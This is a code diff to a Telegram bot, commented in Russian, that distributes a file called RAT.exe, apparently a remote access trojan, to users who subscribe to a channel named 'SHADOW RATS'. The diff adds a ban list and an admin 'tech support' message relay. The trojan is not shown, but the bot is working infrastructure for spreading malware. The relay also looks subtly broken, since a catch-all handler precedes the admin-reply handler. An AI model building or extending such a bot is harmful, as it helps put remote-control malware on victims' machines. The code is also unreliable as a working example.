@@ -11,8 +11,20 @@ CHANNEL_ID = '-1002331312384'
 # Замените на путь к вашему файлу RAT.exe
 RAT_FILE_PATH = 'RAT.exe'
 
+# ID администратора
+ADMIN_ID = 'YOUR_ADMIN_ID'
+
 bot = telebot.TeleBot(API_TOKEN)
 
+# Функция для проверки, забанен ли пользователь
+def is_banned(user_id):
+    if os.path.exists('ban.txt'):
+        with open('ban.txt', 'r') as file:
+            banned_ids = file.read().splitlines()
+            return str(user_id) in banned_ids
+    return False
+
+# Обработка команды /start
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
@@ -35,6 +47,7 @@ def send_welcome(message):
     except Exception as e:
         bot.send_message(message.chat.id, "Произошла ошибка при проверке подписки.")
 
+# Отправка кнопок подписки
 def send_subscription_buttons(chat_id):
     markup = types.InlineKeyboardMarkup()
     subscribe_button = types.InlineKeyboardButton("Подписаться", url="https://t.me/+7U6yF05xjpljODJi")
@@ -42,6 +55,7 @@ def send_subscription_buttons(chat_id):
     markup.add(subscribe_button, check_button)
     bot.send_message(chat_id, "Вы должны быть подписаны на канал [SHADOW RATS] (https://t.me/+7U6yF05xjpljODJi) для получения доступа.", parse_mode='Markdown', reply_markup=markup)
 
+# Обработка колбэка проверки подписки
 @bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
 def check_subscription(call):
     user_id = call.from_user.id
@@ -63,6 +77,7 @@ def check_subscription(call):
     except Exception as e:
         bot.send_message(call.message.chat.id, "Произошла ошибка при проверке подписки.")
 
+# Обработка команды "Инструкция"
 @bot.message_handler(func=lambda message: message.text == "Инструкция")
 def send_instruction(message):
     instruction = (
@@ -86,4 +101,27 @@ def send_instruction(message):
     )
     bot.send_message(message.chat.id, instruction)
 
+# Обработка всех текстовых сообщений
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    user_id = message.from_user.id
+    
+    # Проверка, забанен ли пользователь
+    if is_banned(user_id):
+        return
+    
+    # Пересылка сообщения администратору
+    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
+    bot.send_message(message.chat.id, "Ваше сообщение отправлено в техподдержку. Ожидайте ответа.")
+
+# Обработка ответа администратора
+@bot.message_handler(func=lambda message: message.reply_to_message is not None and message.from_user.id == int(ADMIN_ID))
+def handle_admin_reply(message):
+    original_message = message.reply_to_message
+    user_id = original_message.forward_from.id
+    
+    # Отправка ответа пользователю
+    bot.send_message(user_id, message.text)
+
+# Запуск бота
 bot.polling()
